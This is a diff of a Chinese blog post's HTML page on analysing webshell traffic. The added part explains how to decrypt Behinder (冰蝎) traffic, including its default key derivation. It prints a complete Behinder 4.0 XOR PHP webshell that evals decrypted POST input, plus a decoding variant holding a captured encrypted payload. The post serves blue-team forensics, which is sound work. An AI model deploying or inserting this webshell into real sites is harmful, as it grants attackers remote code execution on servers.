@@ -10,7 +10,7 @@
 <meta property='og:description' content="WebShell流量分析">
 <meta property='og:url' content='https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/'>
 <meta property='og:site_name' content='Lsec&#39;s Blog'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-06-18T23:50:28&#43;08:00'/><meta property='article:modified_time' content='2025-06-19T13:41:31&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/logo.jpeg' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-06-18T23:50:28&#43;08:00'/><meta property='article:modified_time' content='2025-06-27T00:54:44&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/logo.jpeg' />
 <meta name="twitter:title" content="Webshell流量分析">
 <meta name="twitter:description" content="WebShell流量分析"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/logo.jpeg' />
@@ -381,7 +381,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 6 分钟
+                    阅读时长: 7 分钟
                 </time>
             </div>
         
@@ -1113,16 +1113,148 @@
 ></p>
 <p><strong>先看请求头：天蝎每次连接都会在请求头中添加一个XFF字段，并且值是随机的，Content-Type类型为application/octet-stream，连接为长连接，请求体和返回内容都是AES加密的，无明显特征</strong></p>
 <h2 id="6冰蝎流量解密">6.冰蝎流量解密
-</h2><p><a class="link" href="https://mp.weixin.qq.com/s/RbWRJ2SF1PQg6tvNNCU80g"  target="_blank" rel="noopener"
-    >https://mp.weixin.qq.com/s/RbWRJ2SF1PQg6tvNNCU80g</a></p>
+</h2><p><a class="link" href="https://github.com/intbjw/webshell-decryptor"  target="_blank" rel="noopener"
+    ><strong>https://github.com/intbjw/webshell-decryptor</strong></a>  <strong>一款开源解密冰蝎流量工具</strong></p>
+<p><strong>冰蝎流量解密最重要的一步是需要知道冰蝎的key，如果不知道key那么是不可能解密成功的。</strong></p>
+<p><strong>获取key的几个方法：</strong></p>
+<ol>
+<li><strong>默认key为rebeyond md5的前16位</strong></li>
+<li><strong>如果能拿到攻击者上传的webshell文件，可以查看源代码进行分析获取key值</strong></li>
+<li><strong>看冰蝎后门是怎么传来到，如果是通过文件上传漏洞上传上来的，可以从全流量中获取上传数据包拿到key值</strong></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">//冰蝎4.0的异或php木马
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">&lt;?php</span>
+</span></span><span class="line"><span class="cl"><span class="err">@error_reporting(</span><span class="mi">0</span><span class="err">);</span>
+</span></span><span class="line"><span class="cl"><span class="err">function</span> <span class="err">Decrypt($data)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$key=</span><span class="nt">&#34;e45e329feb5d925b&#34;</span><span class="err">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="err">$bs=</span><span class="s2">&#34;base64_&#34;</span><span class="err">.</span><span class="s2">&#34;decode&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">	<span class="err">$after=$bs($data.</span><span class="s2">&#34;&#34;</span><span class="err">);</span>
+</span></span><span class="line"><span class="cl">	<span class="err">for($i=</span><span class="mi">0</span><span class="err">;$i&lt;strlen($after);$i++)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    	<span class="err">$after[$i]</span> <span class="err">=</span> <span class="err">$after[$i]^$key[$i+1&amp;15];</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="err">return</span> <span class="err">$after;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">$post=Decrypt(file_get_contents(</span><span class="s2">&#34;php://input&#34;</span><span class="err">));</span>
+</span></span><span class="line"><span class="cl"><span class="err">@eval($post);</span>
+</span></span><span class="line"><span class="cl"><span class="err">?&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">//只需要将上传的加密脚本下载下来，将流量包内容放到下面Content中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">&lt;?php</span>
+</span></span><span class="line"><span class="cl"><span class="err">@error_reporting(</span><span class="mi">0</span><span class="err">);</span>
+</span></span><span class="line"><span class="cl"><span class="err">function</span> <span class="err">Decrypt($data)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$key=</span><span class="nt">&#34;e45e329feb5d925b&#34;</span><span class="err">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="err">$bs=</span><span class="s2">&#34;base64_&#34;</span><span class="err">.</span><span class="s2">&#34;decode&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">	<span class="err">$after=$bs($data.</span><span class="s2">&#34;&#34;</span><span class="err">);</span>
+</span></span><span class="line"><span class="cl">	<span class="err">for($i=</span><span class="mi">0</span><span class="err">;$i&lt;strlen($after);$i++)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    	<span class="err">$after[$i]</span> <span class="err">=</span> <span class="err">$after[$i]^$key[$i+1&amp;15];</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="err">return</span> <span class="err">$after;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//$post=Decrypt(file_get_contents(&#34;php://input&#34;));
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">$Content=</span> <span class="s2">&#34;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&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl"><span class="err">$post=Decrypt($Content);</span>
+</span></span><span class="line"><span class="cl"><span class="err">var_dump($post);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//@eval($post);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">?&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/14.png"
+	width="2535"
+	height="752"
+	srcset="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/14_hu_f76023be5245e7cf.png 480w, /p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/14_hu_d20b9baa8d1a9390.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="337"
+		data-flex-basis="809px"
+	
+></p>
+<p><strong>运行这个脚本，会生成一段base64的值拿去解密，$cmd中的内容就是攻击者具体执行的命令</strong></p>
+<p><img src="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/15.png"
+	width="1897"
+	height="978"
+	srcset="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/15_hu_df413c0d5f80182f.png 480w, /p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/15_hu_50076ec022689b60.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="193"
+		data-flex-basis="465px"
+	
+></p>
+<p><img src="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/16.png"
+	width="1247"
+	height="636"
+	srcset="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/16_hu_79c7ca2e08f0ba71.png 480w, /p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/16_hu_ecc3387180a83a3d.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="196"
+		data-flex-basis="470px"
+	
+></p>
 <p><strong>使用abc大佬写的蓝队辅助分析工具箱工具进行解密</strong></p>
 <p><strong>项目地址：</strong><a class="link" href="https://github.com/abc123info/BlueTeamTools"  target="_blank" rel="noopener"
     ><strong>https://github.com/abc123info/BlueTeamTools</strong></a></p>
 <p><strong>将加密的请求包内容使用工具进行解密即可查看源码</strong></p>
-<p><img src="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11.png"
+<p><img src="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/17.png"
 	width="2268"
 	height="1171"
-	srcset="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11_hu_148b2411185b16ba.png 480w, /p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11_hu_f74851340f667a4d.png 1024w"
+	srcset="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/17_hu_148b2411185b16ba.png 480w, /p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/17_hu_f74851340f667a4d.png 1024w"
 	loading="lazy"
 	
 		alt="img"
@@ -1133,10 +1265,10 @@
 		data-flex-basis="464px"
 	
 ></p>
-<p><img src="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/12.png"
+<p><img src="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/18.png"
 	width="2042"
 	height="1194"
-	srcset="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/12_hu_7c6cf7f876e4fcda.png 480w, /p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/12_hu_eacd125bf9b3598b.png 1024w"
+	srcset="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/18_hu_7c6cf7f876e4fcda.png 480w, /p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/18_hu_eacd125bf9b3598b.png 1024w"
 	loading="lazy"
 	
 		alt="img"
@@ -1145,6 +1277,20 @@
 		class="gallery-image" 
 		data-flex-grow="171"
 		data-flex-basis="410px"
+	
+></p>
+<p><img src="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/19.png"
+	width="2052"
+	height="1215"
+	srcset="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/19_hu_db9175fb18e57db.png 480w, /p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/19_hu_87c2b7acf8600b3b.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="168"
+		data-flex-basis="405px"
 	
 ></p>
 
@@ -1176,7 +1322,7 @@
 
 
         <span>
-            最后更新于 Jun 19, 2025 13:41 &#43;0800
+            最后更新于 Jun 27, 2025 00:54 &#43;0800
         </span>
     </section></footer>
 
@@ -1192,6 +1338,54 @@
     <h2 class="section-title">相关文章</h2>
     <div class="related-content">
         <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/">
+        
+        
+            <div class="article-image">
+                <img src="/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/2.0545eed92af73300cac3dc878e1aa0fe_hu_f51d45d9e0a593e8.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Windows日志分析"
+                        
+                        data-hash="md5-BUXu2Sr3MwDKw9yHjhqg/g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Windows日志分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/">
+        
+        
+            <div class="article-image">
+                <img src="/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/logo.ffd50f87effc98b74f397333dbaf09e1_hu_6145c4a00df21009.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Windows应急响应方法论"
+                        
+                        data-hash="md5-/9UPh&#43;/8mLdPOXMz268J4Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Windows应急响应方法论</h2>
+        </div>
+    </a>
+</article>
+
             
                 
 <article class="has-image">
@@ -1260,54 +1454,6 @@
 
         <div class="article-details">
             <h2 class="article-title">XML外部实体注入漏洞</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/%E5%86%85%E7%BD%91%E8%BF%9C%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/">
-        
-        
-            <div class="article-image">
-                <img src="/p/%E5%86%85%E7%BD%91%E8%BF%9C%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/logo.27e26041cc2856a527adabb8c78494ea_hu_cc9bfe2f1440a103.png" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy"
-                        alt="Featured image of post 内网远控工具利用思路"
-                        
-                        data-hash="md5-J&#43;JgQcwoVqUnrau4x4SU6g==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">内网远控工具利用思路</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/ssrf/">
-        
-        
-            <div class="article-image">
-                <img src="/p/ssrf/ssrf.82f4b7d8f1ed0a0c59082752f949fe0c_hu_b02e966e9b7304c4.jpg" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy"
-                        alt="Featured image of post SSRF"
-                        
-                        data-hash="md5-gvS32PHtCgxZCCdS&#43;Un&#43;DA==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">SSRF</h2>
         </div>
     </a>
 </article>
